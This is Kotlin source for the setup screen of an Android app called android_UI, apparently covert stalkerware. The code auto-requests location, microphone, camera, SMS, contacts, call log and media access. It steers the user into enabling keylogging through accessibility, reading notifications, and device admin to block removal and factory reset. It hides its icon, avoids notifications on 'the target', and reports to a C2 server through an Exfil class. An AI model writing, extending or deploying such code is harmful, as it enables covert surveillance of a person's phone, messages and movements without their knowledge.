package com.sp.core

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import com.sp.core.services.UsageStatsService
import com.sp.core.stealth.IconHider
import com.sp.core.util.PermState
import com.sp.core.util.Prefs

/**
 * The only screen the user ever sees - the wizard IS the launcher.
 *
 * v1.1.6 made the wizard reachable, but the user still had to tap every
 * button. v1.1.7 runs the whole flow by itself:
 *   1. the runtime permissions are requested group by group (one system
 *      dialog after another, background location separately)
 *   2. the settings screens that cannot be granted by the app itself are
 *      opened one after another (accessibility, notifications, usage access,
 *      overlay, battery, device admin)
 *   3. "Spustiť agenta" at the end
 *
 * The state of the flow is persisted, so a rotation or a low-memory kill
 * does not restart it from step 0 - that was the bug of the old invisible
 * wizard (it granted nothing at all).
 */
class LauncherActivity : Activity() {

    private class Step(
        val title: String,
        val hint: String,
        val granted: (Context) -> Boolean,
        val action: (LauncherActivity) -> Unit
    )

    private lateinit var listBox: LinearLayout
    private lateinit var summary: TextView
    private lateinit var skipBtn: Button
    private lateinit var startBtn: Button

    private val permSteps = mutableListOf<Step>()
    private val specialSteps = mutableListOf<Step>()
    private val steps get() = permSteps + specialSteps

    /** Permission groups waiting for a system dialog, one after another. */
    private val permQueue = ArrayDeque<Array<String>>()

    private val handler = Handler(Looper.getMainLooper())
    private var autoActive = false
    private var autoSpecialIdx = 0
    private var lastSpecial: Step? = null
    private var runtimeDone = false
    private var bgAsked = false
    private var retryDone = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            IconHider.applySaved(this)
        } catch (_: Throwable) {
        }
        try {
            buildSteps()
            setContentView(buildUi())
        } catch (t: Throwable) {
            try {
                setContentView(errorView(t))
            } catch (_: Throwable) {
                finish()
            }
        }
    }

    override fun onResume() {
        super.onResume()
        refresh()
        // No foreground service: on Android 14+ it would show a notification
        // on the target. The watchdog alarm drives the agent instead.
        try { com.sp.watchdog.WatchdogAlarm.arm(this) } catch (_: Throwable) {}
        Thread { try { com.sp.core.agent.AgentWorker.tick(this, force = true) } catch (_: Throwable) {} }.start()

        // The flow continues where it stopped: the user comes back from the
        // settings screen and the next one opens.
        val done = lastSpecial
        if (autoActive && done != null) {
            lastSpecial = null
            handler.postDelayed({ openSpecialStep(autoSpecialIdx + 1) }, 700)
        } else if (autoActive && runtimeDone) {
            // The user came back from the app details screen (background
            // location) - the flow continues with the settings screens.
            handler.postDelayed({ openSpecialStep(autoSpecialIdx) }, 500)
        }

        // First start after the installation / update: run everything without
        // waiting for a tap.
        if (!autoActive && Prefs.get(this, KEY_AUTO, true) as Boolean) {
            handler.postDelayed({ startAutoFlow() }, 600)
        }
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    /* ------------------------------------------------------------------ UI */

    private fun buildUi(): View {
        val scroll = ScrollView(this)
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(24), dp(18), dp(34))
            setBackgroundColor(BG)
        }

        root.addView(TextView(this).apply {
            text = "Nastavenie prístupu"
            setTextColor(TXT)
            textSize = 21f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
        })
        root.addView(TextView(this).apply {
            text = "Všetky oprávnenia sa udeľujú automaticky, po jednom systémovom dialógu. " +
                    "Kroky, ktoré aplikácia nedokáže udať sama (prístupnosť, notifikácie, " +
                    "prístup k štatistikám, prekrytie, batéria, správca zariadenia), " +
                    "sa otvárajú v nastaveniach jeden za druhým."
            setTextColor(DIM)
            textSize = 13f
            setPadding(0, dp(6), 0, dp(14))
        })

        summary = TextView(this).apply {
            setTextColor(DIM2)
            textSize = 12.5f
            setPadding(0, 0, 0, dp(12))
        }
        root.addView(summary)

        val quick = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(14), dp(12), dp(14), dp(12))
            setBackgroundColor(CARD)
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(14) }
        }
        quick.addView(TextView(this).apply {
            text = "Rýchly štart"
            setTextColor(TXT)
            textSize = 14.5f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
        })
        quick.addView(Button(this).apply {
            text = "Udeliť bežné oprávnenia"
            isAllCaps = false
            setOnClickListener { grantRuntimeAll() }
        })
        quick.addView(Button(this).apply {
            text = "Všetky bežné oprávnenia na jednej obrazovke"
            isAllCaps = false
            setOnClickListener { openAppDetails() }
        })
        quick.addView(Button(this).apply {
            text = "Ďalší krok"
            isAllCaps = false
            setOnClickListener { nextStep() }
        })
        quick.addView(Button(this).apply {
            text = "Zopakovať automatické nastavenie"
            isAllCaps = false
            setOnClickListener { startAutoFlow(true) }
        })
        root.addView(quick)

        listBox = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        root.addView(listBox)

        val bottom = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, dp(22), 0, 0)
        }
        skipBtn = Button(this).apply {
            text = "Preskočiť nastavenie"
            isAllCaps = false
            visibility = View.GONE
            setOnClickListener { stopAutoFlow("Nastavenie môžeš dokončiť kedykoľvek") }
        }
        bottom.addView(skipBtn)
        startBtn = Button(this).apply {
            text = "Spustiť agenta"
            setOnClickListener { startAgent() }
        }
        bottom.addView(startBtn)
        bottom.addView(Button(this).apply {
            text = "Skryť ikonu aplikácie"
            isAllCaps = false
            setOnClickListener { hideIcon() }
        })
        bottom.addView(Button(this).apply {
            text = "Zobraziť ikonu aplikácie"
            isAllCaps = false
            setOnClickListener {
                IconHider.show(this@LauncherActivity)
                toast("Ikona je obnovená")
                refresh()
            }
        })
        root.addView(bottom)

        val version = TextView(this).apply {
            text = "android_UI ${com.sp.core.BuildConfig.VERSION_NAME} · Android ${Build.VERSION.RELEASE}"
            setTextColor(DIM2)
            textSize = 12f
            setPadding(0, dp(20), 0, 0)
        }
        root.addView(version)

        scroll.addView(root)
        return scroll
    }

    private fun errorView(t: Throwable): View {
        return TextView(this).apply {
            text = "Chyba pri inicializácii:\n${t.javaClass.simpleName}: ${t.message}"
            setTextColor(TXT)
            textSize = 13f
            setPadding(dp(20), dp(30), dp(20), dp(20))
            setBackgroundColor(BG)
        }
    }

    /* --------------------------------------------------------------- steps */

    private fun buildSteps() {
        permSteps.clear()
        specialSteps.clear()

        permSteps += permStep(
            "Geolokácia (GPS)",
            "Povoliť určovanie polohy cez GPS — bez toho funguje len približná pozícia podľa siete",
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            )
        )
        permSteps += permStep(
            "Pozadie poloha",
            "Samostatné oprávnenie: Android ho vyžaduje udeliť zvlášť, možnosť „Vždy“ je v nastaveniach aplikácie",
            arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        )
        permSteps += permStep(
            "Mikrofón", "Povoliť nahrávanie zvuku v okolí",
            arrayOf(Manifest.permission.RECORD_AUDIO)
        )
        permSteps += permStep(
            "Kamera", "Povoliť prístup ku kamere",
            arrayOf(Manifest.permission.CAMERA)
        )
        permSteps += permStep(
            "SMS", "Povoliť čítanie prichádzajúcich správ", arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS
            )
        )
        permSteps += permStep(
            "Kontakty a hovory", "Povoliť kontakty a históriu hovorov", arrayOf(
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG
            )
        )
        permSteps += permStep(
            "Médiá", "Povoliť prístup ku galérii (fotky a videá)", arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO
            )
        )

        specialSteps += Step(
            "Prístupnosť",
            "V zozname „Nainštalované služby“ nájdi android_UI a zapni ho — to je zachytávanie klávesnice",
            { ctx -> PermState.accessibility(ctx) }
        ) { act -> act.openSettings(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }

        specialSteps += Step(
            "Služba notifikácií",
            "V zozname „Prístup k notifikáciám“ zapni android_UI — tak vidíš správy z messengerov",
            { ctx -> NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName) }
        ) { act -> act.openSettings(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }

        specialSteps += Step(
            "Prístup k štatistikám používania",
            "V zozname aplikácií zapni android_UI — to je štatistika spustených aplikácií",
            { ctx -> PermState.usageAccess(ctx) }
        ) { act -> act.openSettings(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) }

        specialSteps += Step(
            "Prekrytie nad oknami",
            "Povoliť prekrytie cez iné aplikácie",
            { ctx -> PermState.overlay(ctx) }
        ) { act ->
            act.openSettings(
                Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${act.packageName}"))
            )
        }

        specialSteps += Step(
            "Inštalácia neznámych aplikácií",
            "Povoliť inštaláciu ďalších modulov",
            { ctx -> PermState.unknownSources(ctx) }
        ) { act ->
            act.openSettings(
                Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:${act.packageName}"))
            )
        }

        specialSteps += Step(
            "Optimalizácia batérie",
            "Stlač „Povoliť“ — bez toho systém aplikáciu sám ukončí",
            { ctx -> PermState.batteryExempt(ctx) }
        ) { act ->
            act.openSettings(
                Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:${act.packageName}")
                )
            )
        }

        specialSteps += Step(
            "Správca zariadenia",
            "Potvrď „Zapnúť“ — ochrana pred odstránením a resetom do továrenského",
            { ctx -> PermState.deviceAdmin(ctx) }
        ) { act ->
            val admin = ComponentName(act, AdminReceiver::class.java)
            act.openSettings(
                Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                    .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            )
        }
    }

    private fun permStep(
        title: String,
        hint: String,
        perms: Array<String>
    ): Step = Step(title, hint, { ctx -> perms.all { PermState.granted(ctx, it) } }) { act ->
        act.requestPerms(perms)
    }

    private fun refresh() {
        if (!::listBox.isInitialized) return
        listBox.removeAllViews()
        var ok = 0
        steps.forEach { step ->
            val granted = try { step.granted(this) } catch (_: Throwable) { false }
            if (granted) ok++
            listBox.addView(buildRow(step, granted))
        }
        if (::summary.isInitialized) {
            summary.text = "Hotovo $ok / ${steps.size}"
        }
    }

    private fun buildRow(step: Step, granted: Boolean): View {
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(14), dp(12), dp(14), dp(12))
            setBackgroundColor(CARD)
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(9) }
        }

        val head = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
        }
        head.addView(TextView(this).apply {
            text = step.title
            setTextColor(TXT)
            textSize = 14.5f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
        })
        head.addView(TextView(this).apply {
            text = if (granted) "HOTOVO" else "POTREBNÉ"
            textSize = 10.5f
            setTextColor(if (granted) OK else WARN)
            setTypeface(typeface, android.graphics.Typeface.BOLD)
        })
        card.addView(head)

        card.addView(TextView(this).apply {
            text = step.hint
            setTextColor(DIM)
            textSize = 12.5f
            setPadding(0, dp(3), 0, dp(8))
        })

        val btn = Button(this).apply {
            text = if (granted) "Overené" else "Udeliť"
            isAllCaps = false
            textSize = 12.5f
            if (granted) {
                isEnabled = false
                alpha = 0.5f
            } else {
                setOnClickListener { step.action(this@LauncherActivity) }
            }
        }
        card.addView(btn)
        return card
    }

    /* ------------------------------------------------------- permissions */

    /**
     * Requests the given permissions. The queue makes sure only one system
     * dialog is open at a time - a batch that mixes permission groups is
     * silently dropped on Android 11+.
     */
    private fun requestPerms(perms: Array<String>) {
        val missing = perms.filter { !PermState.granted(this, it) }
        if (missing.isEmpty()) {
            afterRuntime()
            return
        }
        permQueue.clear()
        permQueue.addLast(missing.toTypedArray())
        requestNext()
    }

    /** All runtime permissions, group by group, one dialog after another. */
    private fun grantRuntimeAll() {
        permQueue.clear()
        for (group in PERM_GROUPS) {
            val missing = group.filter { !PermState.granted(this, it) }
            if (missing.isNotEmpty()) permQueue.addLast(missing.toTypedArray())
        }
        if (permQueue.isEmpty()) {
            afterRuntime()
            toast("Všetky bežné oprávnenia sú už udelené")
            return
        }
        requestNext()
    }

    private fun requestNext() {
        val next = permQueue.removeFirstOrNull() ?: run {
            afterRuntime()
            return
        }
        try {
            ActivityCompat.requestPermissions(this, next, REQ_PERMS)
        } catch (_: Throwable) {
            afterRuntime()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != REQ_PERMS) return
        val granted = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
        val denied = grantResults.size - granted
        if (denied > 0) {
            toast("Udelených $granted, zamietnutých $denied — zvyšok sa dá udieliť v nastaveniach aplikácie")
        }
        if (permQueue.isNotEmpty()) {
            requestNext()
        } else {
            afterRuntime()
        }
    }

    /* ---------------------------------------------------------- auto flow */

    /**
     * The whole setup runs by itself: runtime dialogs first, then the
     * settings screens one after another.
     */
    private fun startAutoFlow(force: Boolean = false) {
        if (autoActive) return
        autoActive = true
        runtimeDone = false
        bgAsked = false
        retryDone = false
        autoSpecialIdx = if (force) 0 else (Prefs.get(this, KEY_AUTO_IDX, 0) as Int)
        Prefs.set(this, KEY_AUTO_IDX, autoSpecialIdx)
        if (::skipBtn.isInitialized) skipBtn.visibility = View.VISIBLE
        grantRuntimeAll()
    }

    /** Called when the runtime dialogs are done. */
    private fun afterRuntime() {
        refresh()
        if (!autoActive) return
        runtimeDone = true

        // One more pass for the permissions that are still missing - a
        // denied or skipped dialog must not stay denied for good.
        if (!retryDone) {
            val group = PERM_GROUPS.firstOrNull { g ->
                g.any { !PermState.granted(this, it) }
            }
            if (group != null) {
                retryDone = true
                requestPerms(group)
                return
            }
        }
        // Background location is the only runtime permission that has to be
        // granted in the settings - it opens the app details screen. The
        // flow continues in onResume when the user comes back.
        val bg = Manifest.permission.ACCESS_BACKGROUND_LOCATION
        if (Build.VERSION.SDK_INT >= 29 && !PermState.granted(this, bg) && !bgAsked) {
            bgAsked = true
            openSettings(
                Intent(
                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:$packageName")
                )
            )
            return
        }
        openSpecialStep(autoSpecialIdx)
    }

    /** Opens the n-th settings screen of the automatic flow. */
    private fun openSpecialStep(index: Int) {
        if (!autoActive) return
        if (index >= specialSteps.size) {
            // The setup is done - the icon goes away, the app keeps working
            // in the background. The C2 command "wizard" brings it back.
            try { IconHider.hide(this) } catch (_: Throwable) {}
            stopAutoFlow("Nastavenie dokončené — spusti agenta")
            return
        }
        autoSpecialIdx = index
        Prefs.set(this, KEY_AUTO_IDX, index)
        val step = specialSteps[index]
        lastSpecial = step
        try {
            step.action(this)
        } catch (_: Throwable) {
            handler.postDelayed({ openSpecialStep(index + 1) }, 500)
        }
    }

    private fun stopAutoFlow(msg: String) {
        autoActive = false
        lastSpecial = null
        Prefs.set(this, KEY_AUTO, false)
        Prefs.set(this, KEY_AUTO_IDX, 0)
        if (::skipBtn.isInitialized) skipBtn.visibility = View.GONE
        if (::startBtn.isInitialized) startBtn.alpha = 1f
        refresh()
        toast(msg)
    }

    /* ------------------------------------------------------------ misc */

    private fun openAppDetails() {
        openSettings(
            Intent(
                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:$packageName")
            )
        )
    }

    /** Opens the first permission that is still missing. */
    private fun nextStep() {
        val step = steps.firstOrNull { s ->
            try { !s.granted(this) } catch (_: Throwable) { false }
        }
        if (step == null) {
            toast("Všetky oprávnenia sú udelené")
            refresh()
            return
        }
        step.action(this)
    }

    private fun openSettings(intent: Intent) {
        try {
            startActivity(intent)
        } catch (_: Throwable) {
            try {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            } catch (_: Throwable) {
            }
        }
    }

    private fun startAgent() {
        // The agent is driven by the watchdog alarm - no foreground service,
        // so the device shows no notification at all.
        try { com.sp.watchdog.WatchdogAlarm.arm(this) } catch (_: Throwable) {}
        Thread { try { com.sp.core.agent.AgentWorker.tick(this, force = true) } catch (_: Throwable) {} }.start()
        try {
            startService(Intent(this, UsageStatsService::class.java))
        } catch (_: Throwable) {
        }
        try {
            com.sp.core.c2.Exfil.sendLog(this, "cmd_result", """{"cmd":"agent_start","ok":true}""")
        } catch (_: Throwable) {
        }
        toast("Agent je spustený")
    }

    /** Hides the launcher icon without touching the startable component. */
    private fun hideIcon() {
        try {
            IconHider.hide(this)
            toast("Ikona je skrytá, agent beží")
        } catch (_: Throwable) {
        }
        refresh()
    }

    private fun toast(msg: String) {
        try {
            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
        } catch (_: Throwable) {
        }
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()

    companion object {
        private const val REQ_PERMS = 0x5F70

        /** Automatic setup runs on the first start after the installation. */
        const val KEY_AUTO = "wizard_auto"
        const val KEY_AUTO_IDX = "wizard_auto_idx"

        private val BG = 0xFF0B1220.toInt()
        private val CARD = 0xFF16203A.toInt()
        private val TXT = 0xFFE8EEFB.toInt()
        private val DIM = 0xFF8FA1C0.toInt()
        private val DIM2 = 0xFF5D6E8D.toInt()
        private val OK = 0xFF6EE7A0.toInt()
        private val WARN = 0xFFF0B45A.toInt()

        /**
         * Runtime permission groups, in the order the system dialogs are
         * shown. Location in the background is deliberately *not* here: on
         * Android 11+ it is ignored when it is bundled with the foreground
         * group and has to be requested on its own.
         */
        private val PERM_GROUPS = listOf(
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ),
            arrayOf(Manifest.permission.RECORD_AUDIO),
            arrayOf(Manifest.permission.CAMERA),
            arrayOf(Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG),
            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO),
            arrayOf(Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS)
        )
    }
}
